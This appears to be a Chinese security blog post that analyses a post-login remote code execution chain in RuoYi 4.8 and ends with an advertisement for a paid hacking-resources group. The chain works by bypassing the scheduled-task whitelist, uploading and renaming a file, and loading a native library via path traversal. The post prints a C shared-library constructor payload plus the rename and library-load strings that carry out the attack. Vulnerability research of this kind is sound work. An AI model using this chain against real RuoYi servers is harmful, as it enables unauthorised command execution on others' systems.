#  ruoyi系统 4.8 后台RCE漏洞分析   
1506847328721267  神农Sec   2025-05-18 01:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
  
原文链接：  
https://xz.aliyun.com/news/17890  
  
作者：  
1506847328721267  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 环境搭建**  
  
  
利用需要知道profile目录  
  
  
环境搭建如下  
  
  
https://github.com/yangzongzhuan/RuoYi/releases  
  
  
导入数据库，修改application-druid中的数据库账号密码  
  
  
修改application中的文件路径及log存放路径  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9VUs7G6BSpFpGnsfxEp4AyxvEicyGfYKvGdAtqLRZILmat9U8nzMNqyA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9Q6ymvFYpLZfm8riazB0sWIKurr0ib7ibD6jwqpnEqeLxY6uEMIYCyuNPg/640?wx_fmt=png&from=appmsg "")  
  
  
启动成功  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9TzPmzNrJlkDaYg3XXr7j0Ob97icKo2o1XYPiaCzkC4NdlRAOS1eCgEcg/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 漏洞分析**  
  
#### 计划任务  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9O8NpTWvicDpqbn1xgAwicvXia8t7DqWRMK2NP05Wbv3TCzRIktmOpfswA/640?wx_fmt=png&from=appmsg "")  
  
  
根据提交数据包锁定后端路由  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9ROaoUquDrcFaNJPFXftZ8RppcYAvFaeSg0LqNqHJ68Y1fpRgC3fODw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9PP2zliaRFYyKSuZ1FSia0WM7PTQ3EFsiavIx1D56VRya9JgKdX9WACVCw/640?wx_fmt=png&from=appmsg "")  
  
  
调试看一下具体做了什么  
  
  
前几个都是在判断是否有包含rmi ldap http关键词,禁止对这些协议进行调用  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9TYYjdrkYTl3yY6KP8UXLBdcPQXVRzpFhKicPIqOFlqjLI7dCibicOiaoDA/640?wx_fmt=png&from=appmsg "")  
  
  
还判断了是否有一些黑名单中的类  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9fuSJic9Sb2K2q3m67quHM2EJJVHLPfiaeasfhvLyLE1olrBcnNjRrMkg/640?wx_fmt=png&from=appmsg "")  
  
  
进入白名单的判断  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI91IwMWeZCACia01tgdY5vsWJOLQj44JKqJribXcKTEiaibbVKeeHS5X6zQg/640?wx_fmt=png&from=appmsg "")  
  
  
提取出调用的类名，判断其中是否包含白名单字符串  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9cHua68ZBskhZ1RW5DHdW2e8nZYsibLkQcoavYJmF7rOiauzBwRTYnUfQ/640?wx_fmt=png&from=appmsg "")  
  
  
白名单字符串为com.ruoyi.quartz.task  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9HcxXpjQTiaHCzrXY1cszbtErnoa4ib7s94w88csbHfTibkib8jMTLTwibYQ/640?wx_fmt=png&from=appmsg "")  
  
  
注意这里是用正则去匹配的，所以该字符串在任意位置都可以，所以存在可以绕过的可能  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9iadWfA0YMpPAJAcSGdT4W6HS917uP8m7qiczUVBIKUSjwbOXckvxUIyw/640?wx_fmt=png&from=appmsg "")  
  
  
后续就会进入正常的保存计划任务流程  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9N0Y3eQk7vavCfMAAictXMoHDn6j1y9gp7ohIlS9pE1nnEKjhV6VGicuA/640?wx_fmt=png&from=appmsg "")  
  
  
当启动任务时，会调用方法  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9SOxwXZ0Sj6qlPQicfnsSIYWia2DRVMXjLbtb3DHT29u5W1yLicFk0wHow/640?wx_fmt=png&from=appmsg "")  
  
  
获取需要调用的类名方法名参数值  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9JaZ69y0q08g0fK3pXNnO4VxBjic5TST763X2r11a8KyO9D15sUem7EQ/640?wx_fmt=png&from=appmsg "")  
  
  
在获取方法参数时进行了处理，只允许为字符串/布尔/长整/浮点/整形，无法传递类对象  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI91DbPlKS7rECYNQJDBdwf2gO0KicWnSpw8UibgfIibdyPoXyqzj0c1YuMQ/640?wx_fmt=png&from=appmsg "")  
  
  
接着会实例化该类，反射调用其方法  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9ia1hlwBD4PWVDic1QOyeXnQfo77LJbBDS6NAKAfvicNyKvkUAh7mCVTiaw/640?wx_fmt=png&from=appmsg "")  
  
  
该方法为public修饰  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9tINqNzuLgZ0S47HvVRQYehKwrAjSlzFwwwsLcrscpDic2N8yA4S4Fdg/640?wx_fmt=png&from=appmsg "")  
  
  
我们想要利用需要达成的是  
  
  
- 使用的类不在黑名单中  
- 要存在com.ruoyi.quartz.task字符串  
- 不可以使用rmi ldap http协议  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 文件上传**  
  
  
#### 而在ruoyi中存在一个文件上传点  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9RWyNXONUE2DKrn0icrOPtqZL6ZibJbTqXQKEmUicM4YmtW4EaTyQLjFIg/640?wx_fmt=png&from=appmsg "")  
  
  
我们可以随便上传一个文件看看  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9XWC9gEGooHg3XwKgD6KiauYrchFUz3zhQj1icWfcpe55EX8EZ9vDcA5w/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9vAu5OyBqKhxVqpTGv1jvibw8TUs643s2N469GKbf9ya59uE7Vn1A7uw/640?wx_fmt=png&from=appmsg "")  
  
  
那么我们可以上传一个名字包含com.ruoyi.quartz.task字符串的文件  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9I8ecmQdacBllG82Sc9AbSiccA5YtL5rzsjElK1DlYtezIOhZUb9yAbw/640?wx_fmt=png&from=appmsg "")  
  
#### 0x4 RCE  
#### 结合导致RCE  
  
  
在java中存在一种机制叫做JNI，可以通过加载外部链接库，从而执行其中的  
构造函数  
  
  
而com.sun.glass.utils.NativeLibLoader的loadLibrary方法就可以去加载链接库，也是public修饰  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI98kgGHGt6ENKXm17Hy4HTDnOSq7EHKdJxkBAxDFlDcWC7oYeGIs1Kibg/640?wx_fmt=png&from=appmsg "")  
  
  
�  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9EyUOe18FqYVIP9BwRymg3Jy3icLExYkyfvsOyt21LuReeWiaMVhx7SJA/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9USMh0WUaAO9aW6gCff5qwkOic4iajgy8rwP1uDVA7txIT4oqsUxPkmIQ/640?wx_fmt=png&from=appmsg "")  
  
  
注意他会自动在后面添加dylib等后缀，在不同的系统中可能有不同的后缀，并且要注意架构问题  
  
  
构造并上传链接库  
  
```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__ ((__constructor__)) void angel (void) {
    // 调用 system 函数打开计算器应用程序
    system("open -a calculator");
}


//gcc -arch x86_64 -shared -o 1.dylib calc.c
//根据不同架构修改
```  
  
  
编译后上传该文件  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9ZBE2XA7bBIBfzUY6AQyEPcqIEfTf0CgnOclZxZRPMMWlJ1AJZVekjA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9yuJ7rpm9ENjGicgmT0T1gKeUE7MwOGicgTrY3Gvv2doKm7EkcdtVfcHw/640?wx_fmt=png&from=appmsg "")  
  
  
我们还需要修改文件名，可以使用RenameUtil类方法去对文件名进行修改  
  
```
ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying("/Users/Aecous/tmp/upload/2025/04/25/com.ruoyi.quartz.task_20250425182743A001.txt","/Users/Aecous/tmp/upload/2025/04/25/com.ruoyi.quartz.task_20250425182743A001.dylib");
```  
  
可以修改指定文件名  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9xxkPHlf7uPlZSTvdf8P1WSqvkTZF75ltdbAhH8GZBsld5F23O3zYtg/640?wx_fmt=png&from=appmsg "")  
  
  
启动任务  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI92hsHW0tEEcYv8mvsjGPOQ4ssO0xAccic5iaKhp8ebV0oICxI5Qul9gTA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI96hvLBbcBK8FM1icSicsnSjEnlUmdnw1ujEe2R4DgxqOJrctbdVBPenRg/640?wx_fmt=png&from=appmsg "")  
  
  
文件名修改成功  
  
  
尝试rce  
  
```
com.sun.glass.utils.NativeLibLoader.loadLibrary('../../../../../../../../../../../Users/Aecous/tmp/upload/2025/04/25/com.ruoyi.quartz.task_20250425182743A001');
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI9T5v9djfSbzvfgVEuuwqKZBFqmtgUmMtorT1Jxstic7D0CTNqm2HYPow/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPba70icVbicQQUY31ctJXI97XD7fzibqRtaK877jrVq8PNGLvOftJnFRbnWDibFgqNmeVCoZGznRxHw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x5 内部圈子详情介绍**  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于800人 45元/年  
  
星球人数少于1000人 60元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUQrFWcBesgFeibmAaLTXbl25YKcjTuT0F7X8qBLgI7JaOjU1DxsgxfyicbBDibicKwvIhjia1Jm33NQaA/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满800人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXWVBja0AC9744PeXY0zNUj3v6KmOYGICdhjhFw8L88cnT1OrpYgNicV4aoMewFjsYU10dia4BvkUibg/640?wx_fmt=jpeg&from=appmsg "")  
  
****  
    
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
